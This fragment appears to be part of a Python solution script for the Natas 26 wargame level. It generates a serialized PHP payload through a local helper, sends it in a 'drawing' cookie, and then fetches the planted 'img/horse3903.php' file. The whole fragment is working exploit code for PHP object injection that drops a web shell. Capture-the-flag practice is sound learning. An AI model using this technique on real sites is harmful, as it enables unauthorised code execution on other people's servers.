...
alt = "img/horse3903.php"

popen = subprocess.Popen(["php", "./natas/code/natas26-test.php"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

inject = popen.communicate(alt.encode())[0]
inject = inject.decode()

cookies = {"drawing": inject}

test_response, test_soup = send_get_request(website=website, cookies=cookies, username=username, password=password)

final_response, final_soup = send_get_request(website=join_website_dir(website, alt), cookies=cookies, username=username, password=password, get_body=False)
